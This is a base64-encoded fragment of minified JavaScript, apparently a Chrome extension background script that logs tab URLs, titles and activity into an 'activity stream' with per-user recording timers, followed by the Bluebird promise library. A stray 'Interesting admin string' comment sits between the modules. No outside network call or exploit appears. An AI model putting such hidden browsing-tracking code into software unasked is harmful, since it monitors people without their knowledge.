VuY3Rpb24oZSl7cmV0dXJuIHRoaXMuZ2V0KGUpfSxnZXRCeURvbWFpbjpmdW5jdGlvbihlKXt2YXIgdDtyZXR1cm4gdGhpcy5zb3J0KCksdGhpcy5lYWNoKGZ1bmN0aW9uKG4pe3ZhciByPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImEiKTtyLmhyZWY9bi5nZXQoInVybCIpLGU9PT1yLmhvc3RuYW1lJiYodD1uKX0pLHR9fSksUz1uZXcgRDtjaHJvbWUuc3RvcmFnZS5sb2NhbC5nZXQoImJ1ZmZlciIsZnVuY3Rpb24oZSl7ZS5idWZmZXImJlMuc2V0KGUuYnVmZmVyKX0pO3ZhciB4LGo9Yi5Nb2RlbC5leHRlbmQoe2RlZmF1bHRzOmZ1bmN0aW9uKCl7cmV0dXJue3VzZXJzOnt9fX0saW5pdGlhbGl6ZTpmdW5jdGlvbigpeyJyZWNvcmRpbmciaW4gbG9jYWxTdG9yYWdlJiZ0aGlzLnNldChKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5yZWNvcmRpbmcpKTt2YXIgZT10aGlzLmdldCgidXNlcnMiKTtPYmplY3Qua2V5cyhlKS5mb3JFYWNoKHRoaXMuc3RhcnRUaW1lci5iaW5kKHRoaXMpKX0sc3RhcnQ6ZnVuY3Rpb24oZSx0KXt0aGlzLnNldCgiYWN0aXZpdHkiLHQuYWN0aXZpdHkpLHRoaXMuc2V0KCJidWZmZXIiLHQuYnVmZmVyKTt2YXIgbj10aGlzLmdldCgidXNlcnMiKSxyPW5bZS5pZF09bltlLmlkXXx8e307Y2xlYXJUaW1lb3V0KHIudGltZXIpLHIuc3RvcFRpbWU9KG5ldyBEYXRlKS5nZXRUaW1lKCkrMWUzKnQuZHVyYXRpb24sdGhpcy5zdGFydFRpbWVyKGUuaWQpLHYuaSgic3RhcnQgcmVjb3JkaW5nOiIsZS5pZCx0LmFjdGl2aXR5PyJBY3Rpdml0eSBzdHJlYW0gZW5hYmxlZCI6IkFjdGl2aXR5IHN0cmVhbSBESVNBQkxFRCIsIiwgIix0LmJ1ZmZlcj8iQnVmZmVyaW5nIGVuYWJsZWQiOiJCdWZmZXJpbmcgRElTQUJMRUQiKX0sc3RhcnRUaW1lcjpmdW5jdGlvbihlKXt2YXIgdD10aGlzLmdldCgidXNlcnMiKSxuPXRbZV09dFtlXXx8e30scj1uLnN0b3BUaW1lLShuZXcgRGF0ZSkuZ2V0VGltZSgpO3JldHVybiAwPj1yPyh2LmkoIk5vdCBzdGFydGluZyByZWNvcmRpbmcgdGltZXIgZm9yIHVzZXIgIixlLCIgYmVjYXVzZSBpdCdzIGV4cGlyZWQiKSxkZWxldGUgdFtlXSx2b2lkIHRoaXMuc2F2ZSgpKToobi50aW1lcj1zZXRUaW1lb3V0KGZ1bmN0aW9uKCl7di5pKCJSZWNvcmRpbmcgZHVyYXRpb24gZXhwaXJlZCBmb3IgdXNlcjoiLGUpLGRlbGV0ZSB0W2VdLHRoaXMuc2F2ZSgpfS5iaW5kKHRoaXMpLHIpLHZvaWQgdGhpcy5zYXZlKCkpfSxzdG9wOmZ1bmN0aW9uKGUpe3ZhciB0PXRoaXMuZ2V0KCJ1c2VycyIpLG49dFtlLmlkXT10W2UuaWRdfHx7fTtjbGVhclRpbWVvdXQobi50aW1lciksZGVsZXRlIHRbZS5pZF0sdGhpcy5zYXZlKCksdi5pKCJSZWNvcmRpbmcgZHVyYXRpb24gc3RvcHBlZCBmb3IgdXNlcjoiLGUuaWQpfSxzYXZlOmZ1bmN0aW9uKCl7bG9jYWxTdG9yYWdlLnJlY29yZGluZz1KU09OLnN0cmluZ2lmeSh0aGlzKX0saXNBY3RpdmU6ZnVuY3Rpb24oKXt2YXIgZT10aGlzLmdldCgidXNlcnMiKSx0PSExO3JldHVybiB5LnVzZXJzLmFjdGl2ZVVzZXJzKCkuZm9yRWFjaChmdW5jdGlvbihuKXtuLmlkIGluIGUmJih0PSEwKX0pLHR9fSksSD1uZXcgaixQPW0uZGVib3VuY2UoZnVuY3Rpb24oZSl7aWYoIUEubGVuZ3RoKXt2YXIgdD1lfHxjKCk7aWYodCl7dmFyIG49aSh0KTtpZihuLmlkIGluIFIpcmV0dXJuO24udHlwZT0idGFiLXN0YXkiLHUobil9fX0sMmUzKSxFPWIuTW9kZWwuZXh0ZW5kKHtkZWZhdWx0czpmdW5jdGlvbigpe3JldHVybntpZDpudWxsLHVybDpudWxsLHRpdGxlOm51bGwsaWNvbjpudWxsLHN0YXR1czpudWxsLGFjdGl2ZTpudWxsLGdsb2JhbEFjdGl2ZTpudWxsLHdoZW46TWF0aC5yb3VuZCgobmV3IERhdGUpLmdldFRpbWUoKS8xZTMpfX0saW5pdGlhbGl6ZTpmdW5jdGlvbigpe3RoaXMubGlzdGVuVG8odGhpcywiY2hhbmdlOnN0YXR1cyIsdGhpcy5jaGVja0xvYWRpbmdUaW1lciksdGhpcy5saXN0ZW5Ubyh0aGlzLCJjaGFuZ2U6Z2xvYmFsQWN0aXZlIixmdW5jdGlvbihlLHQpe3QmJlAoZSl9KSx0aGlzLmxpc3RlblRvKHRoaXMsInJlbW92ZSIsZnVuY3Rpb24oKXt0aGlzLnRpbWVyJiZjbGVhclRpbWVvdXQodGhpcy50aW1lciksdGhpcy5zdG9wTGlzdGVuaW5nKCl9KSx0aGlzLmNoZWNrTG9hZGluZ1RpbWVyKCl9LGNoZWNrTG9hZGluZ1RpbWVyOmZ1bmN0aW9uKCl7ImxvYWRpbmciPT09dGhpcy5nZXQoInN0YXR1cyIpJiYodGhpcy50aW1lcj1zZXRUaW1lb3V0KGZ1bmN0aW9uKCl7ImxvYWRpbmciPT09dGhpcy5nZXQoInN0YXR1cyIpJiZjaHJvbWUudGFicy5nZXQodGhpcy5pZCxmdW5jdGlvbihlKXtyZXR1cm4gY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yP3ZvaWQgdi5lKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcik6KHRoaXMuc2V0KHIoZSkpLGRlbGV0ZSB0aGlzLnRpbWVyLHZvaWQgdGhpcy5jaGVja0xvYWRpbmdUaW1lcigpKX0uYmluZCh0aGlzKSl9LmJpbmQodGhpcyksZikpfX0pLEY9Yi5Db2xsZWN0aW9uLmV4dGVuZCh7bW9kZWw6RX0pO3RyeXt4PW5ldyBGKGxvY2FsU3RvcmFnZS50YWJzJiZKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS50YWJzKSl9Y2F0Y2goQyl7di5lKCJGYWlsZWQgdG8gcGFyc2UgbG9jYWxTdG9yYWdlLnRhYnM6ICIrQyksbG9jYWxTdG9yYWdlLnRhYnMmJihuKDE0OCkucmVwb3J0KCJpbnZhbGlkIGxvY2FsU3RvcmFnZS50YWJzOiAiK2xvY2FsU3RvcmFnZS50YWJzLCExKSxkZWxldGUgbG9jYWxTdG9yYWdlLnRhYnMpLHg9bmV3IEZ9eC5vbigiYWRkIHJlbW92ZSBjaGFuZ2UiLGZ1bmN0aW9uKCl7bG9jYWxTdG9yYWdlLnRhYnM9SlNPTi5zdHJpbmdpZnkodGhpcyl9KTt2YXIgQT1bXSxPPW0uZGVib3VuY2UobS50aHJvdHRsZShzLDVlMyksMmUzKSxSPXt9O3gub24oImFkZCIsZnVuY3Rpb24oZSl7aWYoImxvYWRpbmciIT09ZS5nZXQoInN0YXR1cyIpKXt2YXIgdD1pKGUpO3QudHlwZT0idGFiLW9wZW4iLHUodCksZS5zZXQoInByZXZpb3VzUGF5bG9hZCIsaShlKSl9fSk7dmFyIE49Xy5tYXAoZnVuY3Rpb24oZSl7cmV0dXJuImNoYW5nZToiK2Uua2V5fSkuam9pbigiICIpKyIgY2hhbmdlOnN0YXR1cyI7eC5vbihOLGZ1bmN0aW9uKGUpe2lmKCJsb2FkaW5nIiE9PWUuZ2V0KCJzdGF0dXMiKSl7dmFyIHQ9ZS5nZXQoInByZXZpb3VzUGF5bG9hZCIpfHx7fSxuPWkoZSkscj0wO18uZm9yRWFjaChmdW5jdGlvbihlKXt0W2Uua2V5XSE9PW5bZS5rZXldJiYocisrLG5bZS5wcmlvcktleV09dFtlLmtleV0pfSksMCE9PXImJihuLnR5cGU9InRhYi1jaGFuZ2UiLHUobiksZS5zZXQoInByZXZpb3VzUGF5bG9hZCIsaShlKSkpfX0pLHgub24oInJlbW92ZSIsZnVuY3Rpb24oZSl7dmFyIHQ9aShlKTt0LnR5cGU9InRhYi1jbG9zZSIsdSh0KX0pLGQoKSxzZXRJbnRlcnZhbChkLDVlMyksdi5kKCJhY3Rpdml0eSBzdHJlYW0gc3RhcnRpbmciKSxjaHJvbWUudGFicy5vbkNyZWF0ZWQuYWRkTGlzdGVuZXIoZnVuY3Rpb24oZSl7eC5hZGQocihlKSx7bWVyZ2U6ITB9KX0pLGNocm9tZS50YWJzLm9uVXBkYXRlZC5hZGRMaXN0ZW5lcihmdW5jdGlvbihlLHQsbil7eC5hZGQocihuKSx7bWVyZ2U6ITB9KX0pLGNocm9tZS50YWJzLm9uQXR0YWNoZWQuYWRkTGlzdGVuZXIoZnVuY3Rpb24oZSx0KXtoKGUpLnRoZW4oZnVuY3Rpb24oZSl7ZS5zZXQoIndpbmRvd0lkIix0Lm5ld1dpbmRvd0lkKX0sZnVuY3Rpb24oKXt9KX0pLGNocm9tZS50YWJzLm9uQWN0aXZhdGVkLmFkZExpc3RlbmVyKGZ1bmN0aW9uKGUpe2goZS50YWJJZCkudGhlbihmdW5jdGlvbih0KXt4LmZpbHRlcihmdW5jdGlvbih0KXtyZXR1cm4gdC5pZCE9PWUudGFiSWQmJnQuZ2V0KCJ3aW5kb3dJZCIpPT09ZS53aW5kb3dJZCYmdC5nZXQoImFjdGl2ZSIpfSkuZm9yRWFjaChmdW5jdGlvbihlKXtlLnNldCgiYWN0aXZlIiwhMSl9KSx0LnNldCgiYWN0aXZlIiwhMCksbCgpfSxmdW5jdGlvbigpe30pfSksY2hyb21lLnRhYnMub25SZW1vdmVkLmFkZExpc3RlbmVyKGZ1bmN0aW9uKGUpe3ZhciB0PXguZ2V0KGUpO3QmJngucmVtb3ZlKHQpfSksY2hyb21lLnRhYnMub25SZXBsYWNlZC5hZGRMaXN0ZW5lcihmdW5jdGlvbihlLHQpe3ZhciBuPXguZ2V0KHQpO24mJngucmVtb3ZlKG4pLGgoZSl9KSxjaHJvbWUud2luZG93cy5vbkZvY3VzQ2hhbmdlZC5hZGRMaXN0ZW5lcihmdW5jdGlvbihlKXtUPWUsbCgpfSksZS5leHBvcnRzPXtleHRlbnNpb25BZGRUYWI6ZnVuY3Rpb24oZSl7di5kKCJleHRlbnNpb25BZGRUYWIiLGUpO3ZhciB0PXIoZSk7dC5hZG1pbj0hMCx4LmFkZCh0LHttZXJnZTohMH0pfSxleHRlbnNpb25SZW1vdmVUYWI6ZnVuY3Rpb24oZSl7di5kKCJleHRlbnNpb25SZW1vdmVUYWIiLGUpO3ZhciB0PXguZ2V0KGUpO3QmJnQuc2V0KCJhZG1pbiIsITApfSx0YWJzOngscmVjb3JkaW5nOkgsYnVmZmVyOlMsdGh1bWJXYWl0aW5nU2VuZDpBfX0sLGZ1bmN0aW9uKGUsdCxuKXsoZnVuY3Rpb24odCxuLHIpew0KLyogYXBwIGluaXRpYWxpemF0aW9uIChJbnRlcmVzdGluZyBhZG1pbiBzdHJpbmcpIC0tPiAqLw0KDQovKiA8IS0tIEJsdWVCaXJkICovDQohZnVuY3Rpb24odCl7ZS5leHBvcnRzPXQoKX0oZnVuY3Rpb24oKXt2YXIgZSxpLHM7cmV0dXJuIGZ1bmN0aW9uIG8oZSx0LG4pe2Z1bmN0aW9uIHIocyxhKXtpZighdFtzXSl7aWYoIWVbc10pe3ZhciB1PSJmdW5jdGlvbiI9PXR5cGVvZiBfZGVyZXFfJiZfZGVyZXFfO2lmKCFhJiZ1KXJldHVybiB1KHMsITApO2lmKGkpcmV0dXJuIGkocywhMCk7dmFyIGM9bmV3IEVycm9yKCJDYW5ub3QgZmluZCBtb2R1bGUgJyIrcysiJyIpO3Rocm93IGMuY29kZT0iTU9EVUxFX05PVF9GT1VORCIsY312YXIgbD10W3NdPXtleHBvcnRzOnt9fTtlW3NdWzBdLmNhbGwobC5leHBvcnRzLGZ1bmN0aW9uKHQpe3ZhciBuPWVbc11bMV1bdF07cmV0dXJuIHIobj9uOnQpfSxsLGwuZXhwb3J0cyxvLGUsdCxuKX1yZXR1cm4gdFtzXS5leHBvcnRzfWZvcih2YXIgaT0iZnVuY3Rpb24iPT10eXBlb2YgX2RlcmVxXyYmX2RlcmVxXyxzPTA7czxuLmxlbmd0aDtzKyspcihuW3NdKTtyZXR1cm4gcn0oezE6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dC5leHBvcnRzPWZ1bmN0aW9uKGUpe2Z1bmN0aW9uIHQoZSl7dmFyIHQ9bmV3IG4oZSkscj10LnByb21pc2UoKTtyZXR1cm4gdC5zZXRIb3dNYW55KDEpLHQuc2V0VW53cmFwKCksdC5pbml0KCkscn12YXIgbj1lLl9Tb21lUHJvbWlzZUFycmF5O2UuYW55PWZ1bmN0aW9uKGUpe3JldHVybiB0KGUpfSxlLnByb3RvdHlwZS5hbnk9ZnVuY3Rpb24oKXtyZXR1cm4gdCh0aGlzKX19fSx7fV0sMjpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKCl7dGhpcy5faXNUaWNrVXNlZD0hMSx0aGlzLl9sYXRlUXVldWU9bmV3IGwoMTYpLHRoaXMuX25vcm1hbFF1ZXVlPW5ldyBsKDE2KSx0aGlzLl90cmFtcG9saW5lRW5hYmxlZD0hMDt2YXIgZT10aGlzO3RoaXMuZHJhaW5RdWV1ZXM9ZnVuY3Rpb24oKXtlLl9kcmFpblF1ZXVlcygpfSx0aGlzLl9zY2hlZHVsZT1jLmlzU3RhdGljP2ModGhpcy5kcmFpblF1ZXVlcyk6Y31mdW5jdGlvbiBpKGUsdCxuKXt0aGlzLl9sYXRlUXVldWUucHVzaChlLHQsbiksdGhpcy5fcXVldWVUaWNrKCl9ZnVuY3Rpb24gcyhlLHQsbil7dGhpcy5fbm9ybWFsUXVldWUucHVzaChlLHQsbiksdGhpcy5fcXVldWVUaWNrKCl9ZnVuY3Rpb24gbyhlKXt0aGlzLl9ub3JtYWxRdWV1ZS5fcHVzaE9uZShlKSx0aGlzLl9xdWV1ZVRpY2soKX12YXIgYTt0cnl7dGhyb3cgbmV3IEVycm9yfWNhdGNoKHUpe2E9dX12YXIgYz1lKCIuL3NjaGVkdWxlLmpzIiksbD1lKCIuL3F1ZXVlLmpzIiksZD1lKCIuL3V0aWwuanMiKTtyLnByb3RvdHlwZS5kaXNhYmxlVHJhbXBvbGluZUlmTmVjZXNzYXJ5PWZ1bmN0aW9uKCl7ZC5oYXNEZXZUb29scyYmKHRoaXMuX3RyYW1wb2xpbmVFbmFibGVkPSExKX0sci5wcm90b3R5cGUuZW5hYmxlVHJhbXBvbGluZT1mdW5jdGlvbigpe3RoaXMuX3RyYW1wb2xpbmVFbmFibGVkfHwodGhpcy5fdHJhbXBvbGluZUVuYWJsZWQ9ITAsdGhpcy5fc2NoZWR1bGU9ZnVuY3Rpb24oZSl7c2V0VGltZW91dChlLDApfSl9LHIucHJvdG90eXBlLmhhdmVJdGVtc1F1ZXVlZD1mdW5jdGlvbigpe3JldHVybiB0aGlzLl9ub3JtYWxRdWV1ZS5sZW5ndGgoKT4wfSxyLnByb3RvdHlwZS50aHJvd0xhdGVyPWZ1bmN0aW9uKGUsdCl7aWYoMT09PWFyZ3VtZW50cy5sZW5ndGgmJih0PWUsZT1mdW5jdGlvbigpe3Rocm93IHR9KSwidW5kZWZpbmVkIiE9dHlwZW9mIHNldFRpbWVvdXQpc2V0VGltZW91dChmdW5jdGlvbigpe2UodCl9LDApO2Vsc2UgdHJ5e3RoaXMuX3NjaGVkdWxlKGZ1bmN0aW9uKCl7ZSh0KX0pfWNhdGNoKG4pe3Rocm93IG5ldyBFcnJvcigiTm8gYXN5bmMgc2NoZWR1bGVyIGF2YWlsYWJsZVxuXG4gICAgU2VlIGh0dHA6Ly9nb28uZ2wvbTNPVFhrXG4iKX19LGQuaGFzRGV2VG9vbHM/KGMuaXNTdGF0aWMmJihjPWZ1bmN0aW9uKGUpe3NldFRpbWVvdXQoZSwwKX0pLHIucHJvdG90eXBlLmludm9rZUxhdGVyPWZ1bmN0aW9uKGUsdCxuKXt0aGlzLl90cmFtcG9saW5lRW5hYmxlZD9pLmNhbGwodGhpcyxlLHQsbik6dGhpcy5fc2NoZWR1bGUoZnVuY3Rpb24oKXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7ZS5jYWxsKHQsbil9LDEwMCl9KX0sci5wcm90b3R5cGUuaW52b2tlPWZ1bmN0aW9uKGUsdCxuKXt0aGlzLl90cmFtcG9saW5lRW5hYmxlZD9zLmNhbGwodGhpcyxlLHQsbik6dGhpcy5fc2NoZWR1bGUoZnVuY3Rpb24oKXtlLmNhbGwodCxuKX0pfSxyLnByb3RvdHlwZS5zZXR0bGVQcm9taXNlcz1mdW5jdGlvbihlKXt0aGlzLl90cmFtcG9saW5lRW5hYmxlZD9vLmNhbGwodGhpcyxlKTp0aGlzLl9zY2hlZHVsZShmdW5jdGlvbigpe2UuX3NldHRsZVByb21pc2VzKCl9KX0pOihyLnByb3RvdHlwZS5pbnZva2VMYXRlcj1pLHIucHJvdG90eXBlLmludm9rZT1zLHIucHJvdG90eXBlLnNldHRsZVByb21pc2VzPW8pLHIucHJvdG90eXBlLmludm9rZUZpcnN0PWZ1bmN0aW9uKGUsdCxuKXt0aGlzLl9ub3JtYWxRdWV1ZS51bnNoaWZ0KGUsdCxuKSx0aGlzLl9xdWV1ZVRpY2soKX0sci5wcm90b3R5cGUuX2RyYWluUXVldWU9ZnVuY3Rpb24oZSl7Zm9yKDtlLmxlbmd0aCgpPjA7KXt2YXIgdD1lLnNoaWZ0KCk7aWYoImZ1bmN0aW9uIj09dHlwZW9mIHQpe3ZhciBuPWUuc2hpZnQoKSxyPWUuc2hpZnQoKTt0LmNhbGwobixyKX1lbHNlIHQuX3NldHRsZVByb21pc2VzKCl9fSxyLnByb3RvdHlwZS5fZHJhaW5RdWV1ZXM9ZnVuY3Rpb24oKXt0aGlzLl9kcmFpblF1ZXVlKHRoaXMuX25vcm1hbFF1ZXVlKSx0aGlzLl9yZXNldCgpLHRoaXMuX2RyYWluUXVldWUodGhpcy5fbGF0ZVF1ZXVlKX0sci5wcm90b3R5cGUuX3F1ZXVlVGljaz1mdW5jdGlvbigpe3RoaXMuX2lzVGlja1VzZWR8fCh0aGlzLl9pc1RpY2tVc2VkPSEwLHRoaXMuX3NjaGVkdWxlKHRoaXMuZHJhaW5RdWV1ZXMpKX0sci5wcm90b3R5cGUuX3Jlc2V0PWZ1bmN0aW9uKCl7dGhpcy5faXNUaWNrVXNlZD0hMX0sdC5leHBvcnRzPW5ldyByLHQuZXhwb3J0cy5maXJzdExpbmVFcnJvcj1hfSx7Ii4vcXVldWUuanMiOjI4LCIuL3NjaGVkdWxlLmpzIjozMSwiLi91dGlsLmpzIjozOH1dLDM6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dC5leHBvcnRzPWZ1bmN0aW9uKGUsdCxuKXt2YXIgcj1mdW5jdGlvbihlLHQpe3RoaXMuX3JlamVjdCh0KX0saT1mdW5jdGlvbihlLHQpe3QucHJvbWlzZVJlamVjdGlvblF1ZXVlZD0hMCx0LmJpbmRpbmdQcm9taXNlLl90aGVuKHIscixudWxsLHRoaXMsZSl9LHM9ZnVuY3Rpb24oZSx0KXt0aGlzLl9pc1BlbmRpbmcoKSYmdGhpcy5fcmVzb2x2ZUNhbGxiYWNrKHQudGFyZ2V0KX0sbz1mdW5jdGlvbihlLHQpe3QucHJvbWlzZVJlamVjdGlvblF1ZXVlZHx8dGhpcy5fcmVqZWN0KGUpfTtlLnByb3RvdHlwZS5iaW5kPWZ1bmN0aW9uKHIpe3ZhciBhPW4ociksdT1uZXcgZSh0KTt1Ll9wcm9wYWdhdGVGcm9tKHRoaXMsMSk7dmFyIGM9dGhpcy5fdGFyZ2V0KCk7aWYodS5fc2V0Qm91bmRUbyhhKSxhIGluc3RhbmNlb2YgZSl7dmFyIGw9e3Byb21pc2VSZWplY3Rpb25RdWV1ZWQ6ITEscHJvbWlzZTp1LHRhcmdldDpjLGJpbmRpbmdQcm9taXNlOmF9O2MuX3RoZW4odCxpLHUuX3Byb2dyZXNzLHUsbCksYS5fdGhlbihzLG8sdS5fcHJvZ3Jlc3MsdSxsKX1lbHNlIHUuX3Jlc29sdmVDYWxsYmFjayhjKTtyZXR1cm4gdX0sZS5wcm90b3R5cGUuX3NldEJvdW5kVG89ZnVuY3Rpb24oZSl7dm9pZCAwIT09ZT8odGhpcy5fYml0RmllbGQ9MTMxMDcyfHRoaXMuX2JpdEZpZWxkLHRoaXMuX2JvdW5kVG89ZSk6dGhpcy5fYml0RmllbGQ9LTEzMTA3MyZ0aGlzLl9iaXRGaWVsZH0sZS5wcm90b3R5cGUuX2lzQm91bmQ9ZnVuY3Rpb24oKXtyZXR1cm4gMTMxMDcyPT09KDEzMTA3MiZ0aGlzLl9iaXRGaWVsZCl9LGUuYmluZD1mdW5jdGlvbihyLGkpe3ZhciBzPW4ociksbz1uZXcgZSh0KTtyZXR1cm4gby5fc2V0Qm91bmRUbyhzKSxzIGluc3RhbmNlb2YgZT9zLl90aGVuKGZ1bmN0aW9uKCl7by5fcmVzb2x2ZUNhbGxiYWNrKGkpfSxvLl9yZWplY3Qsby5fcHJvZ3Jlc3MsbyxudWxsKTpvLl9yZXNvbHZlQ2FsbGJhY2soaSksb319fSx7fV0sNDpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKCl7dHJ5e1Byb21pc2U9PT1zJiYoUHJvbWlzZT1pKX1jYXRjaChlKXt9cmV0dXJuIHN9dmFyIGk7InVuZGVmaW5lZCIhPXR5cGVvZiBQcm9taXNlJiYoaT1Qcm9taXNlKTt2YXIgcz1lKCIuL3Byb21pc2UuanMiKSgpO3Mubm9Db25mbGljdD1yLHQuZXhwb3J0cz1zfSx7Ii4vcHJvbWlzZS5qcyI6MjN9XSw1OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO3ZhciByPU9iamVjdC5jcmVhdGU7aWYocil7dmFyIGk9cihudWxsKSxzPXIobnVsbCk7aVsiIHNpemUiXT1zWyIgc2l6ZSJdPTB9dC5leHBvcnRzPWZ1bmN0aW9uKHQpe2Z1bmN0aW9uIG4oZSxuKXt2YXIgcjtpZihudWxsIT1lJiYocj1lW25dKSwiZnVuY3Rpb24iIT10eXBlb2Ygcil7dmFyIGk9Ik9iamVjdCAiK2EuY2xhc3NTdHJpbmcoZSkrIiBoYXMgbm8gbWV0aG9kICciK2EudG9TdHJpbmcobikrIiciO3Rocm93IG5ldyB0LlR5cGVFcnJvcihpKX1yZXR1cm4gcn1mdW5jdGlvbiByKGUpe3ZhciB0PXRoaXMucG9wKCkscj1uKGUsdCk7cmV0dXJuIHIuYXBwbHkoZSx0aGlzKX1mdW5jdGlvbiBpKGUpe3JldHVybiBlW3RoaXNdfWZ1bmN0aW9uIHMoZSl7dmFyIHQ9K3RoaXM7cmV0dXJuIDA+dCYmKHQ9TWF0aC5tYXgoMCx0K2UubGVuZ3RoKSksZVt0XX12YXIgbyxhPWUoIi4vdXRpbC5qcyIpLHU9YS5jYW5FdmFsdWF0ZTthLmlzSWRlbnRpZmllcjt0LnByb3RvdHlwZS5jYWxsPWZ1bmN0aW9uKGUpe2Zvcih2YXIgdD1hcmd1bWVudHMubGVuZ3RoLG49bmV3IEFycmF5KHQtMSksaT0xO3Q+aTsrK2kpbltpLTFdPWFyZ3VtZW50c1tpXTtyZXR1cm4gbi5wdXNoKGUpLHRoaXMuX3RoZW4ocix2b2lkIDAsdm9pZCAwLG4sdm9pZCAwKX0sdC5wcm90b3R5cGUuZ2V0PWZ1bmN0aW9uKGUpe3ZhciB0LG49Im51bWJlciI9PXR5cGVvZiBlO2lmKG4pdD1zO2Vsc2UgaWYodSl7dmFyIHI9byhlKTt0PW51bGwhPT1yP3I6aX1lbHNlIHQ9aTtyZXR1cm4gdGhpcy5fdGhlbih0LHZvaWQgMCx2b2lkIDAsZSx2b2lkIDApfX19LHsiLi91dGlsLmpzIjozOH1dLDY6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dC5leHBvcnRzPWZ1bmN0aW9uKHQpe3ZhciBuPWUoIi4vZXJyb3JzLmpzIikscj1lKCIuL2FzeW5jLmpzIiksaT1uLkNhbmNlbGxhdGlvbkVycm9yO3QucHJvdG90eXBlLl9jYW5jZWw9ZnVuY3Rpb24oZSl7aWYoIXRoaXMuaXNDYW5jZWxsYWJsZSgpKXJldHVybiB0aGlzO2Zvcih2YXIgdCxuPXRoaXM7dm9pZCAwIT09KHQ9bi5fY2FuY2VsbGF0aW9uUGFyZW50KSYmdC5pc0NhbmNlbGxhYmxlKCk7KW49dDt0aGlzLl91bnNldENhbmNlbGxhYmxlKCksbi5fdGFyZ2V0KCkuX3JlamVjdENhbGxiYWNrKGUsITEsITApfSx0LnByb3RvdHlwZS5jYW5jZWw9ZnVuY3Rpb24oZSl7cmV0dXJuIHRoaXMuaXNDYW5jZWxsYWJsZSgpPyh2b2lkIDA9PT1lJiYoZT1uZXcgaSksci5pbnZva2VMYXRlcih0aGlzLl9jYW5jZWwsdGhpcyxlKSx0aGlzKTp0aGlzfSx0LnByb3RvdHlwZS5jYW5jZWxsYWJsZT1mdW5jdGlvbigpe3JldHVybiB0aGlzLl9jYW5jZWxsYWJsZSgpP3RoaXM6KHIuZW5hYmxlVHJhbXBvbGluZSgpLHRoaXMuX3NldENhbmNlbGxhYmxlKCksdGhpcy5fY2FuY2VsbGF0aW9uUGFyZW50PXZvaWQgMCx0aGlzKX0sdC5wcm90b3R5cGUudW5jYW5jZWxsYWJsZT1mdW5jdGlvbigpe3ZhciBlPXRoaXMudGhlbigpO3JldHVybiBlLl91bnNldENhbmNlbGxhYmxlKCksZX0sdC5wcm90b3R5cGUuZm9yaz1mdW5jdGlvbihlLHQsbil7dmFyIHI9dGhpcy5fdGhlbihlLHQsbix2b2lkIDAsdm9pZCAwKTtyZXR1cm4gci5fc2V0Q2FuY2VsbGFibGUoKSxyLl9jYW5jZWxsYXRpb25QYXJlbnQ9dm9pZCAwLHJ9fX0seyIuL2FzeW5jLmpzIjoyLCIuL2Vycm9ycy5qcyI6MTN9XSw3OltmdW5jdGlvbihlLG4scil7InVzZSBzdHJpY3QiO24uZXhwb3J0cz1mdW5jdGlvbigpe2Z1bmN0aW9uIG4oZSl7dGhpcy5fcGFyZW50PWU7dmFyIHQ9dGhpcy5fbGVuZ3RoPTErKHZvaWQgMD09PWU/MDplLl9sZW5ndGgpO00odGhpcyxuKSx0PjMyJiZ0aGlzLnVuY3ljbGUoKX1mdW5jdGlvbiByKGUsdCl7Zm9yKHZhciBuPTA7bjx0Lmxlbmd0aC0xOysrbil0W25dLnB1c2goIkZyb20gcHJldmlvdXMgZXZlbnQ6IiksdFtuXT10W25dLmpvaW4oIlxuIik7cmV0dXJuIG48dC5sZW5ndGgmJih0W25dPXRbbl0uam9pbigiXG4iKSksZSsiXG4iK3Quam9pbigiXG4iKX1mdW5jdGlvbiBpKGUpe2Zvcih2YXIgdD0wO3Q8ZS5sZW5ndGg7Kyt0KSgwPT09ZVt0XS5sZW5ndGh8fHQrMTxlLmxlbmd0aCYmZVt0XVswXT09PWVbdCsxXVswXSkmJihlLnNwbGljZSh0LDEpLHQtLSl9ZnVuY3Rpb24gcyhlKXtmb3IodmFyIHQ9ZVswXSxuPTE7bjxlLmxlbmd0aDsrK24pe2Zvcih2YXIgcj1lW25dLGk9dC5sZW5ndGgtMSxzPXRbaV0sbz0tMSxhPXIubGVuZ3RoLTE7YT49MDstLWEpaWYoclthXT09PXMpe289YTticmVha31mb3IodmFyIGE9bzthPj0wOy0tYSl7dmFyIHU9clthXTtpZih0W2ldIT09dSlicmVhazt0LnBvcCgpLGktLX10PXJ9fWZ1bmN0aW9uIG8oZSl7Zm9yKHZhciB0PVtdLG49MDtuPGUubGVuZ3RoOysrbil7dmFyIHI9ZVtuXSxpPV8udGVzdChyKXx8IiAgICAoTm8gc3RhY2sgdHJhY2UpIj09PXIscz1pJiZnKHIpO2kmJiFzJiYoeSYmIiAiIT09ci5jaGFyQXQoMCkmJihyPSIgICAgIityKSx0LnB1c2gocikpfXJldHVybiB0fWZ1bmN0aW9uIGEoZSl7Zm9yKHZhciB0PWUuc3RhY2sucmVwbGFjZSgvXHMrJC9nLCIiKS5zcGxpdCgiXG4iKSxuPTA7bjx0Lmxlbmd0aDsrK24pe3ZhciByPXRbbl07aWYoIiAgICAoTm8gc3RhY2sgdHJhY2UpIj09PXJ8fF8udGVzdChyKSlicmVha31yZXR1cm4gbj4wJiYodD10LnNsaWNlKG4pKSx0fWZ1bmN0aW9uIHUoZSl7dmFyIHQ7aWYoImZ1bmN0aW9uIj09dHlwZW9mIGUpdD0iW2Z1bmN0aW9uICIrKGUubmFtZXx8ImFub255bW91cyIpKyJdIjtlbHNle3Q9ZS50b1N0cmluZygpO3ZhciBuPS9cW29iamVjdCBbYS16QS1aMC05JF9dK1xdLztpZihuLnRlc3QodCkpdHJ5e3ZhciByPUpTT04uc3RyaW5naWZ5KGUpO3Q9cn1jYXRjaChpKXt9MD09PXQubGVuZ3RoJiYodD0iKGVtcHR5IGFycmF5KSIpfXJldH